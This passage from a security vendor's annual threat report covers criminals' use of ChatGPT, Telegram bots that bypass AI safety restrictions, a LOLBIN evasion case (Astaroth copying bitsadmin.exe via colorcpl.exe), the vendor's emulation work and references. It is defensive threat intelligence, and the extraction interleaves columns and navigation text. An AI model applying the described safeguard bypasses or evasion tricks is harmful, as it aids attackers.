04 When Infection Chains Are
Forced to Evolve
State-Sponsored
05
Threat Activity
Threat Actor Use of
06
Artificial Intelligence
07 Conclusion
08 Appendix
2023 State of the Threat: A Year in Review 66

Threat actors and researchers are experimenting with the creation
01 Letter From Our VP
of malware which leverages ChatGPT functionality for defense
evasion and code creation. However, these types of AI models base
their responses to user inputs on statistical analysis of previously
Executive Summary
02 produced text and do not currently demonstrate the creativity and
and Key Findings
ingenuity of human coders when finding novel ways to circumvent
security controls and discover new vulnerabilities.
The Business of Cybercrime—
03 In addition, some threat actors are advertising and selling access to
Is Boomtime Back?
AI-based Telegram bots as a subscription service (see figure 30).
These bots allow users to request the creation of malicious scripts,
craft phishing emails, or search for illicit goods on the dark web.
Innovations in TTPs Occur
Figure 31. Underground forum posts reflecting an increased interest in AI and
The bot owners employ a pricing model that charges users by the
04 When Infection Chains Are ML. (Source: Secureworks)
Forced to Evolve interaction. For example, one seller offered 20 unrestricted initial
queries but charged $5.50 USD for every subsequent 100 queries.
These Telegram bots may enable low-skilled threat actors to use
Despite an abundance of sensationalist headlines and hyperbole
State-Sponsored ChatGPT functionality, bypassing ethical restrictions. The threat
05 around ChatGPT and AI creating some kind of “super intelligent
Threat Activity actors could create low-value untested malware that they may
malware,” the reality does not yet match up. The most common
attempt to sell on underground forums, regardless of the quality and
use of ChatGPT we have seen is as lures in phishing emails or on
integrity of the code. This approach is unlikely to provide meaningful
malicious sites. These sites impersonate ChatGPT via typosquatting
Threat Actor Use of volume or competition for the plethora of existing malware available
06
Artificial Intelligence domains such as “chat-gpt-online-pc.com” and “openai-pc-pro. already from criminal developers, at least in the short term.
online,” with the aim of creating convincing home pages to prompt
users into following malicious links or installing malicious browser
07 Conclusion extensions.
08 Appendix
2023 State of the Threat: A Year in Review 67

01 Letter From Our VP
Executive Summary
02
and Key Findings
The Business of Cybercrime—
03 Figure 33. XSSBot is ready to answer questions. (Source: Secureworks)
Is Boomtime Back?
Innovations in TTPs Occur Threat actors often share research and ideas on underground
Figure 32. Example ChatGPT Telegram bot advertised on underground forum.
04 When Infection Chains Are (Source: Secureworks) forums, for example on how to use prompt engineering to
Forced to Evolve
circumvent restrictions regarding ChatGPT requests. CTU
researchers have observed users seeking information about how
The rate at which AI is developing could change this situation, with ChatGPT can improve their malicious code or streamline and
State-Sponsored
05 one security researcher with minimal coding experience reportedly automate elements of their research and development. These
Threat Activity
generating in a matter of hours an infostealer that was not detected forums will likely be a fertile breeding ground for experimentation
by any antivirus engines on VirusTotal75. This capability is likely and sharing of ideas.
already in the hands of larger teams of determined and experienced
Threat Actor Use of
06 malware authors experimenting with how they can exploit these As of mid-2023, despite these discussions and the obvious level
Artificial Intelligence
capabilities. of interest displayed, phishing lures and Telegram bots remain the
major implementations. However, this could change soon. Criminal
Many criminal forums now have dedicated sub-forums to discuss AI actors are also experimenting with other Large Language Models
07 Conclusion
and machine learning. One forum (XSS) has created an AI Bot (called beyond ChatGPT in an attempt to provide features that will aid
XSSBot) which will answer questions put to it by users of the forum. criminal cyber activity, without the need to circumvent restrictions
from commercial services.
08 Appendix
2023 State of the Threat: A Year in Review 68

07
Conclusion
01 Letter From Our VP
Executive Summary
02
and Key Findings One of the things that makes cybersecurity such a fascinating more frequently than newly discovered ones. This continues
and challenging field is the need to combat and stay one step to demonstrate the value of focusing on the cybersecurity
ahead of the continuing ingenuity of threat actors that this report fundamentals alongside staying current on the latest exploits and
The Business of Cybercrime— demonstrates. Sometimes their innovations are driven by law TTPs.
03
Is Boomtime Back?
enforcement activity, such as taking down criminal marketplaces and
forums, or by industry actions like Microsoft's disabling of macros The advice we regularly provide to customers is as relevant as ever:
by default, or sometimes by political imperatives like China's desire Identify your assets and their location on your network, stay up to
Innovations in TTPs Occur
to frustrate detection of its cyberespionage activities. Often, they date with what is happening in the threat landscape, understand your
04 When Infection Chains Are
are another step in the arms race between malicious actors and the risk profile and use it to prioritize your control framework and your
Forced to Evolve
efforts of companies like Secureworks to create the detections and approach to vulnerability management. Lockdown internet-facing
countermeasures that power systems like Taegis™ and protect our systems and sensitive internal systems using fully implemented best-
customers. Some events, like Microsoft's decision to disable macros, practice MFA. Instrument your network to provide comprehensive
State-Sponsored
05 force almost immediate change on the part of threat actors. Other monitoring of all endpoint, network, and cloud resources. We
Threat Activity
changes are more gradual. understand that these recommendations, simple as they are to make,
can sometimes be challenging to implement. However, working
However, as fast as some threat actors are to innovate, many are closely with a trusted technology partner like Secureworks provides a
Threat Actor Use of
06
Artificial Intelligence happy to continue doing what still works. CISA's annual roundup significant step forward in ensuring that your security practice keeps
of top routinely exploited vulnerabilities reinforces that point— you safe.
in 202276, threat actors exploited older software vulnerabilities
07 Conclusion
08 Appendix
2023 State of the Threat: A Year in Review 69

08
Appendix
01 Letter From Our VP
Executive Summary
02
and Key Findings Taegis and the Secureworks View This data combines to illustrate threat actor behavior, revealing both
high-level tactics and the technical details about their tooling. It
of the Threat
feeds the threat intelligence products published every week by the
The Business of Cybercrime— CTU, and the unified “Rosetta Stone” that relates our threat groups to
03
Is Boomtime Back? Secureworks' view of the threat landscape comes from a
the naming conventions used by other TI providers.
combination of telemetry from the Taegis™ XDR and VDR platforms,
incident response and Secureworks Adversary Group customer
It also produces inputs for the repository of knowledge that drives
Innovations in TTPs Occur engagements, and technical and tactical research conducted by the
the elite threat detection and integrated response actions that Taegis
04 When Infection Chains Are Counter Threat Unit. These inputs combine to produce high-fidelity
delivers. Other inputs include threat actor emulation and botnet
Forced to Evolve visibility into threat actor intent, capability, and activity; and feed into
emulation.
actionable intelligence what organizations need to do to reduce their
risk.
State-Sponsored
05
Threat Activity • In the 12 months from July 2022, the Secureworks Incident
1,300+ 1.8 Trillion+
Response team and Secureworks Counter Threat Unit
conducted 1,300+ incident response engagements, across
Threat Actor Use of IR Engagements Event Logs a Week
06 a wide spectrum of industry sectors.
Artificial Intelligence
• Secureworks processes over 1.8 trillion event logs a
100+ CTU Researchers Gather Data from:
week, or around 610 billion logs every single working day,
07 Conclusion gathered from security infrastructure in thousands of
customer environments around the world.
08 Appendix • CTU researchers gather and analyze data from internally I nternally Generated/ Publicly Intelligence
generated and externally collected telemetry, from multiple Externally Collected Available Relationships
Telemetry Information
sources including publicly available information, dark
web forums, proprietary botnet emulation systems, and
intelligence relationships.
2023 State of the Threat: A Year in Review 70

Threat Actor Emulation—Feeding before they can cause significant harm to customers. This allows
01 Letter From Our VP
us to adopt a strategic defensive stance, better safeguarding the
the Virtuous Circle Within Taegis
privacy and security of our clients and partners.
Executive Summary Emulating offensive tools and techniques within a secure and
02 The result is a more resilient cybersecurity infrastructure that
and Key Findings controlled environment allows CTU researchers to immerse
safeguards our customers' and partners' critical assets and data and
themselves in the mindset of threat actors, creating valuable insights
feeds back into our threat intelligence.
into their methodologies and strategies.
The Business of Cybercrime—
03
Is Boomtime Back? Taegis™ is at the core of this endeavor, tracking and monitoring
activity on our test systems throughout the emulated attacks. The The Value of Botnet Emulation
platform captures system telemetry and performs near-real-time
Innovations in TTPs Occur analysis of the data. As we closely monitor these emulated attacks, The CTU botnet emulator system allows our researchers
04 When Infection Chains Are to maintain real-time situational awareness of
we make context-aware adjustments to our defense strategies,
Forced to Evolve
cybercriminal threats through perpetual automated
fortifying potential weak points identified during testing. This
engagement with threat actor infrastructure.
adaptive approach helps us to keep up with changes in the threat
landscape and proactively strengthens the platform's capabilities. Direct participation in a botnet provides an opportunity for
State-Sponsored
05
near-immediate discovery of new infrastructure, protocol
Threat Activity
Threat emulation also provides additional experience in countering changes, and delivered commands and payloads as well
a wide array of cyber threats, and helps refine real-time threat as monitoring the botnet's availability. These interactions
detection, defensive measures, incident response, and vulnerability are not dictated by a malware's normal execution control
Threat Actor Use of
06 mitigation. flow and instead allow for systematic interrogation that
Artificial Intelligence
can extract more information from C2 servers than under
It also fosters a culture of continuous improvement within our normal circumstances.
team. Regular debriefings and comprehensive post-mortem
07 Conclusion Direct communication with attacker infrastructure also
analyses after each emulation provide the opportunity to identify
allows us to publish indicators at high confidence levels.
and address shortcomings or potential blind spots in our defense
Previously this type of information had to be gathered
08 Appendix mechanisms. The lessons learned are then incorporated into ongoing passively through client telemetry or observation of
improvements to the platform, ensuring that our defense strategies sandbox detonations which provide an incomplete picture.
evolve alongside the ever-changing threat landscape.
By maintaining a proactive approach to understanding offensive
tools and techniques, we are better equipped to anticipate threats
2023 State of the Threat: A Year in Review 71

The Taegis Intelligence to Reviewing our telemetry revealed events showing Astaroth activity
01 Letter From Our VP
in a customer environment, and a high severity alert generated for
Protection Pipeline in Action
the client for an AppLocker Bypass Process run from \System32\
spool\drivers\color. Because there was no alert for the copying of
Executive Summary An open-source report77 about the Guildma/Astaroth stealer led
02 bitsadmin.exe into the non-standard directory, our researcher raised
and Key Findings one of our researchers to request countermeasure creation, leading
a countermeasure request to identify future occurrences of this
to the detection of similar activity in customer environments. The
malicious activity.
report detailed how Astaroth was observed abusing the colorcpl.
The Business of Cybercrime— exe LOLBIN to copy bitsadmin.exe into a non-standard directory 'c:\
03 The resulting countermeasure alerted on similar malicious process
Is Boomtime Back?
windows\system32\spool\drivers\color\. This was likely to bypass
executions in another customer's environment. Secureworks
security controls that detect the abuse of bitsadmin.exe executed on
escalated the incident to the customer via a high-severity
its original folder.
investigation and incident response was invoked.
Innovations in TTPs Occur
04 When Infection Chains Are
Forced to Evolve
State-Sponsored
05
Threat Activity
Threat Actor Use of
06
Artificial Intelligence
07 Conclusion
08 Appendix
Figure 34. Bitsadmin.exe events in a customer environment.
(Source: Secureworks.)
2023 State of the Threat: A Year in Review 72

1   2022 State of the Threat: A Year in Review,   14  U.S. Department of Justice Disrupts Hive Ransomware  28  Hello Ransomware Uses Updated China Chopper Web
https://www.secureworks.com/resources/rp-state-of-the- Variant, https://www.justice.gov/opa/pr/us-department- Shell, SharePoint Vulnerability, https://www.trendmicro.
threat-2022, 9/22. justice-disrupts-hive-ransomware-variant, 1/26/23. com/en_us/research/21/d/hello-ransomware-uses-
updated-china-chopper-web-shell-sharepoint-vulnerability.
2  Secureworks threat profiles,   15  Exclusive: US government agencies hit in global  html, 4/27/21.
| https://www.secureworks.com/research/threat-profiles | cyberattack, https://edition.cnn.com/2023/06/15/politics/ |                                                              |
| ---------------------------------------------------- | --------------------------------------------------------- | ------------------------------------------------------------ |
|                                                      | us-government-hit-cybeattack/index.html, 6/15/23.         | 29  Seven International Cyber Defendants, Including “Apt41”  |
3  MalasLocker ransomware targets Zimbra servers,  Actors, Charged In Connection With Computer Intrusion
Campaigns Against More Than 100 Victims Globally,
| demands charity donation, https://www.bleepingcomputer. | 16  Royal Mail cyberattack linked to LockBit ransomware  |     |
| ------------------------------------------------------- | -------------------------------------------------------- | --- |
com/news/security/malaslocker-ransomware-targets- operation, https://www.bleepingcomputer.com/news/ https://www.justice.gov/opa/pr/seven-international-cyber-
zimbra-servers-demands-charity-donation/, 5/17/23. security/royal-mail-cyberattack-linked-to-lockbit- defendants-including-apt41-actors-charged-connection-
|     | ransomware-operation/, 1/12/23.  | computer, 9/16/20. |
| --- | -------------------------------- | ------------------ |
4  Ransomware Revenue Down As More Victims Refuse
to Pay, https://blog.chainalysis.com/reports/crypto- 17  Authorities Warn Health Sector of Attacks by Rhysida  30  OPSEC MISTAKES REVEAL COBALT MIRAGE THREAT
ransomware-revenue-down-as-victims-refuse-to-pay/,  Group, https://www.bankinfosecurity.com/authorities- ACTORS, https://www.secureworks.com/blog/opsec-
1/19/23. warn-health-sector-attacks-by-rhysida-group-a-22753,  mistakes-reveal-cobalt-mirage-threat-actors, 9/14/22.
8/7/23.
5  Infostealer Market Booming, Despite Genesis Market and  31  Three Iranian Nationals Charged with Engaging in
RaidForums Takedowns, https://www.secureworks.com/ 18  Babuk Source Code Sparks 9 Different Ransomware  Computer Intrusions and Ransomware-Style Extortion
Against U.S. Critical Infrastructure Providers, https://
| about/press/infostealer-market-booming-despite-genesis- | Strains Targeting VMware ESXi Systems, https:// |     |
| ------------------------------------------------------- | ----------------------------------------------- | --- |
market-and-raidforums-takedowns, 5/16/23. thehackernews.com/2023/05/babuk-source-code-sparks- www.justice.gov/opa/pr/three-iranian-nationals-charged-
|     | 9-new.html, 5/11/23.  | engaging-computer-intrusions-and-ransomware-style- |
| --- | --------------------- | -------------------------------------------------- |
extortion, 9/14/22.
6  BRONZE STARLIGHT RANSOMWARE OPERATIONS USE
| HUI LOADER, https://www.secureworks.com/research/ | 19  Massive ESXiArgs ransomware attack targets VMware  |     |
| ------------------------------------------------- | ------------------------------------------------------ | --- |
bronze-starlight-ransomware-operations-use-hui-loader,  ESXi servers worldwide, https://www.bleepingcomputer. 32  Treasury Sanctions IRGC-Affiliated Cyber Actors for
6/23/22. com/news/security/massive-esxiargs-ransomware-attack- Roles in Ransomware Activity, https://home.treasury.gov/
|     | targets-vmware-esxi-servers-worldwide/, 2/3/23. | news/press-releases/jy0948, 9/14/22. |
| --- | ----------------------------------------------- | ------------------------------------ |
7  CISA, NSA, FBI, and International Partners Release Joint
CSA on Top Routinely Exploited Vulnerabilities of 2022,  20  Critical Infrastructure Sectors, https://www.cisa.gov/ 33  Internet Crime Report 2022, https://www.ic3.gov/Media/
https://www.cisa.gov/news-events/alerts/2023/08/03/cisa- topics/critical-infrastructure-security-and-resilience/ PDF/AnnualReport/2022_IC3Report.pdf, 3/13/23.
| nsa-fbi-and-international-partners-release-joint-csa-top- | critical-infrastructure-sectors, accessed 8/18/23.  |     |
| --------------------------------------------------------- | --------------------------------------------------- | --- |
routinely-exploited-vulnerabilities, 8/3/23. 34  Macros from the internet will be blocked by default in
|     | 21  What effects have sanctions had on the Russian  | Office, https://learn.microsoft.com/en-us/deployoffice/ |
| --- | --------------------------------------------------- | ------------------------------------------------------- |
security/internet-macros-blocked, 2/28/23.
| 8  BA, BBC and Boots hit by cyber security breach with  | economy? https://www.weforum.org/agenda/2022/12/ |     |
| ------------------------------------------------------- | ------------------------------------------------ | --- |
| contact and bank details exposed, https://news.sky.     | sanctions-russian-economy-effects/, 12/22/22.    |     |
com/story/bas-uk-staff-exposed-to-global-data-theft- 35  DARKTORTILLA MALWARE ANALYSIS, https://www.
spree-12896900, 6/5/23. secureworks.com/research/darktortilla-malware-analysis,
22  United States v. Conor Brian Fitzpatrick, https://www.
|                                                  | justice.gov/usao-edva/united-states-v-conor-brian- | 8/17/22. |
| ------------------------------------------------ | -------------------------------------------------- | -------- |
| 9  Reward Offers for Information to Bring Conti  | fitzpatrick, Updated 6/20/23.                      |          |
Ransomware Variant Co-Conspirators to Justice, https:// 36  Qakbot Malware Disrupted in International Cyber
www.state.gov/reward-offers-for-information-to-bring- 23  BreachForums owner Pompompurin pleads guilty to  Takedown, https://www.justice.gov/usao-cdca/pr/qakbot-
conti-ransomware-variant-co-conspirators-to-justice/,  hacking charges, https://www.bleepingcomputer.com/ malware-disrupted-international-cyber-takedown, 8/29/23.
| 5/6/23. | news/security/breachforums-owner-pompompurin-pleads- |                                                         |
| ------- | ---------------------------------------------------- | ------------------------------------------------------- |
|         | guilty-to-hacking-charges/, 7/14/23.                 | 37  Gootloader malware updated with PowerShell, sneaky  |
10  Ransomware Revenue Down As More Victims Refuse  JavaScript, https://www.theregister.com/2023/01/30/
to Pay, https://blog.chainalysis.com/reports/crypto- 24  U.S. Department of Justice Disrupts Hive Ransomware  gootloader_mandiant_malware/, 1/30/23.
| ransomware-revenue-down-as-victims-refuse-to-pay/,  | Variant, https://www.justice.gov/opa/pr/us-department- |     |
| --------------------------------------------------- | ------------------------------------------------------ | --- |
1/19/23.
|     | justice-disrupts-hive-ransomware-variant, 1/26/23. | 38  Healthcare Sector Warned About Increase in GootLoader  |
| --- | -------------------------------------------------- | ---------------------------------------------------------- |
Malware Infections, https://www.hipaajournal.com/
11  ITG23 Crypters Highlight Cooperation Between  25  Cuba ransomware believed to be Russian state-backed  healthcare-sector-warned-about-increase-in-gootloader-
Cybercriminal Groups, https://securityintelligence.com/ malware-infections/, 2/15/23.
operation, https://www.scmagazine.com/brief/threat-
| posts/itg23-crypters-cooperation-between-cybercriminal- | intelligence/cuba-ransomware-believed-to-be-russian- |     |
| ------------------------------------------------------- | ---------------------------------------------------- | --- |
groups/, 5/19/23.  state-backed-operation, 5/17/23. 39  Use Microsoft Purview Audit (Premium) to investigate
compromised accounts, https://learn.microsoft.com/
12  Recovery of Colonial Pipeline ransom funds highlights  26  RomCom malware spread via Google Ads for ChatGPT,  en-us/purview/audit-log-investigate-accounts?view=o365-
traceability of cryptocurrency, experts say, https://www. GIMP, more, https://www.bleepingcomputer.com/news/ worldwide, 7/21/23.
| thomsonreuters.com/en-us/posts/investigation-fraud-and- | security/romcom-malware-spread-via-google-ads-for- |     |
| ------------------------------------------------------- | -------------------------------------------------- | --- |
risk/colonial-pipeline-ransom-funds/, 6/23/21. chatgpt-gimp-more/, 5/30/23. 40  Obfuscated Files or Information: HTML Smuggling,
https://attack.mitre.org/techniques/T1027/006/, accessed
| 13  Ransomware criminals sanctioned in joint UK/US   | 27  Cyber attack on state organizations of Ukraine using  | 8/18/23. |
| ---------------------------------------------------- | --------------------------------------------------------- | -------- |
| crackdown on international cyber crime, https://www. | RomCom malware. Possible involvement of Cuba              |          |
nationalcrimeagency.gov.uk/news/ransomware-criminals-
|     | Ransomware aka Tropical Scorpius aka UNC2596 (CERT- | 41  The Abraham Accords, https://www.state.gov/the- |
| --- | --------------------------------------------------- | --------------------------------------------------- |
sanctioned-in-joint-uk-us-crackdown-on-international- UA#5509), https://cert.gov.ua/article/2394117, 10/22/22. abraham-accords/, 9/15/20.
cyber-crime, 2/9/23.
2023 State of the Threat: A Year in Review 73

42  OPSEC MISTAKES REVEAL COBALT MIRAGE THREAT  56  ABRAHAM'S AX LIKELY LINKED TO MOSES STAFF,  71  Supply-chain attack on 3CX clients, https://www.
ACTORS, https://www.secureworks.com/blog/opsec- https://www.secureworks.com/blog/abrahams-ax-likely- kaspersky.com/blog/supply-chain-attack-on-3cx/47698/,
| mistakes-reveal-cobalt-mirage-threat-actors, 9/14/22. | linked-to-moses-staff, 1/26/23. | 3/30/23. |
| ----------------------------------------------------- | ------------------------------- | -------- |
43  Iran's Widening Crackdown Pressures Rouhani, https:// 57  Treasury Sanctions Iran Cyber Actors for Attempting  72  3CX Software Supply Chain Compromise Initiated by a
www.washingtoninstitute.org/policy-analysis/irans- to Influence the 2020 U.S. Presidential Election, https:// Prior Software Supply Chain Compromise; Suspected
widening-crackdown-pressures-rouhani, 11/25/15. home.treasury.gov/news/press-releases/jy0494, 11/18/21. North Korean Actor Responsible, https://www.mandiant.
com/resources/blog/3cx-software-supply-chain-
compromise, 4/27/23.
| 44  Seven Iranians Working for Islamic Revolutionary Guard  | 58  Predatory Sparrow: Who are the hackers who say they  |     |
| ----------------------------------------------------------- | -------------------------------------------------------- | --- |
| Corps-Affiliated Entities Charged for Conducting            | started a fire in Iran? https://www.bbc.co.uk/news/      |     |
Coordinated Campaign of Cyber Attacks Against  technology-62072480, 7/11/22. 73  North Korean Lazarus Hacking Group Leverages Supply
U.S. Financial Sector, https://www.justice.gov/opa/pr/ Chain Attacks To Distribute Malware for Cyber Espionage,
seven-iranians-working-islamic-revolutionary-guard-corps- 59  Predatory Sparrow operation against Iranian steel maker  https://www.cpomagazine.com/cyber-security/north-
affiliated-entities-charged, 3/24/16. (2022), https://cyberlaw.ccdcoe.org/wiki/Predatory_ korean-lazarus-hacking-group-leverages-supply-chain-
|                                                               | Sparrow_operation_against_Iranian_steel_maker_(2022),  | attacks-to-distribute-malware-for-cyber-espionage/,  |
| ------------------------------------------------------------- | ------------------------------------------------------ | ---------------------------------------------------- |
| 45  Treasury Sanctions Iranian Organizations and Individuals  | 8/17/22.                                               | 11/5/21.                                             |
Supporting Intelligence and Cyber Targeting of U.S.
Persons, https://home.treasury.gov/news/press-releases/ 60  Treasury Sanctions Iranian Ministry of Intelligence  74  North Korea's Lazarus Group Turns to Supply Chain
sm611, 2/13/19. and Minister for Malign Cyber Activities, https://home. Attacks, https://www.darkreading.com/threat-intelligence/
north-korea-s-lazarus-group-turns-to-supply-chain-attacks,
treasury.gov/news/press-releases/jy0941, 9/9/22.
| 46  Treasury Sanctions Cyber Actors Backed by Iranian  |                                                              | 10/26/21. |
| ------------------------------------------------------ | ------------------------------------------------------------ | --------- |
| Intelligence Ministry, https://home.treasury.gov/news/ | 61  Cybercriminals attempt to attack Ukrainian governmental  |           |
press-releases/sm1127, 9/17/20. 75  ChatGPT just created malware, and that's seriously
agencies with fake OS updates, https://cip.gov.ua/
|     | en/news/kiberzlovmisniki-namagayutsya-atakuvati- | scary, https://www.digitaltrends.com/computing/chatgpt- |
| --- | ------------------------------------------------ | ------------------------------------------------------- |
47  Treasury Sanctions Iranian Officials and Entities  derzhorgani-ukrayini-feikovimi-onovlennyami-operaciinoyi- created-malware/, 4/7/23.
| Responsible for Ongoing Crackdown on Protests and  | sistemi, 4/29/23. |     |
| -------------------------------------------------- | ----------------- | --- |
Internet Censorship, https://home.treasury.gov/news/ 76  CISA, NSA, FBI, and International Partners Release Joint
press-releases/jy1048, 10/26/22. 62  AppleJeus: Analysis of North Korea's Cryptocurrency  CSA on Top Routinely Exploited Vulnerabilities of 2022,
|     | Malware, https://www.cisa.gov/news-events/cybersecurity- | https://www.cisa.gov/news-events/alerts/2023/08/03/cisa- |
| --- | -------------------------------------------------------- | -------------------------------------------------------- |
48  Iranian intel cyber suite of malware uses open  advisories/aa21-048a, 4/15/21. nsa-fbi-and-international-partners-release-joint-csa-top-
routinely-exploited-vulnerabilities, 8/3/23.
source tools, https://www.cybercom.mil/Media/News/
| Article/2897570/iranian-intel-cyber-suite-of-malware-uses- | 63  North Korean crypto thefts target Japan, Vietnam, Hong  |     |
| ---------------------------------------------------------- | ----------------------------------------------------------- | --- |
open-source-tools/, 1/12/22. Kong, https://asia.nikkei.com/Spotlight/Cryptocurrencies/ 77  Guildma is now abusing colorcpl.exe LOLBIN, https://isc.
sans.edu/diary/rss/29814, 5/5/23.
North-Korean-crypto-thefts-target-Japan-Vietnam-Hong-
| 49  Acting Manhattan U.S. Attorney Announces Charges  | Kong, 5/15/23. |     |
| ----------------------------------------------------- | -------------- | --- |
Against Iranian National For Conducting Cyber Attack
And $6 Million Extortion Scheme Against HBO, https://
64  North Korea Exports, https://tradingeconomics.com/north-
| www.justice.gov/usao-sdny/pr/acting-manhattan-us- | korea/exports, accessed 8/18/23. |     |
| ------------------------------------------------- | -------------------------------- | --- |
attorney-announces-charges-against-iranian-national-
conducting, 11/21/17.
65  Operation AppleJeus: Lazarus hits cryptocurrency
exchange with fake installer and macOS malware, https://
| 50  MOST WANTED: BEHZAD MESRI, https://www.fbi.gov/ | securelist.com/operation-applejeus/87553/, 8/23/18. |     |
| --------------------------------------------------- | --------------------------------------------------- | --- |
wanted/cyber/copy_of_behzad-mesri, 2/13/19.
66  BlueNoroff APT group targets macOS with “RustBucket”
| 51  Treasury Sanctions Iranian Organizations and Individuals  | Malware, https://www.jamf.com/blog/bluenoroff-apt- |     |
| ------------------------------------------------------------- | -------------------------------------------------- | --- |
| Supporting Intelligence and Cyber Targeting of U.S.           | targets-macos-rustbucket-malware, 4/21/23.         |     |
Persons, https://home.treasury.gov/news/press-releases/
sm611, 2/13/19.
67  I see what you did there: A look at the CloudMensis
macOS spyware, https://www.welivesecurity.
| 52  Emennet Pasargad, https://rewardsforjustice.net/rewards/ | com/2022/07/19/i-see-what-you-did-there-look- |     |
| ------------------------------------------------------------ | --------------------------------------------- | --- |
emennet-pasargad/, undated.
cloudmensis-macos-spyware/, 7/19/22.
| 53  Charming Kitten: “Can We Have A Meeting?”, https:// | 68  TraderTraitor: North Korean State-Sponsored APT Targets  |     |
| ------------------------------------------------------- | ------------------------------------------------------------ | --- |
blog.certfa.com/posts/charming-kitten-can-we-wave-a-
Blockchain Companies, https://www.cisa.gov/news-events/
| meeting/, 9/8/22. | cybersecurity-advisories/aa22-108a, 4/20/22. |     |
| ----------------- | -------------------------------------------- | --- |
54  COBALT ILLUSION MASQUERADES AS ATLANTIC
69  Linux malware strengthens links between Lazarus and
| COUNCIL EMPLOYEE, https://www.secureworks.com/blog/        | the 3CX supply-chain attack, https://www.welivesecurity. |     |
| ---------------------------------------------------------- | -------------------------------------------------------- | --- |
| cobalt-illusion-masquerades-as-atlantic-council-employee,  | com/2023/04/20/linux-malware-strengthens-links-lazarus-  |     |
| 3/9/23.                                                    | 3cx-supply-chain-attack, 4/20/23.                        |     |
| 55  2021 STATE OF THE THREAT REPORT, https://www.          | 70  Kimsuky | Ongoing Campaign Using Tailored            |     |
| secureworks.com/resources/rp-state-of-the-threat-2021,     | Reconnaissance Toolkit, https://www.sentinelone.         |     |
| 9/21.                                                      | com/labs/kimsuky-ongoing-campaign-using-tailored-        |     |
reconnaissance-toolkit/, 5/23/23.
2023 State of the Threat: A Year in Review 74

ABOUT SECUREWORKS
Secureworks® (NASDAQ: SCWX) is a global cybersecurity leader that protects customer
progress with Secureworks® Taegis™, a cloud-native security analytics platform built on
20+ years of real-world threat intelligence and research, improving customers' ability to
detect advanced threats, streamline and collaborate on investigations, and automate
the right actions.
For more information, call 1-877-838-7947 to speak to a
Secureworks security specialist or visit secureworks.com
Availability varies by region. ©2023 SecureWorks, Inc. All rights reserved.
2023 State of the Threat: A Year in Review 75

<!-- CONVERSION_METADATA: {"source": "https://github.com/jacobdjwilson/awesome-annual-security-reports", "date": "2026-11-08", "model": "gemini-3.8-flash"} -->
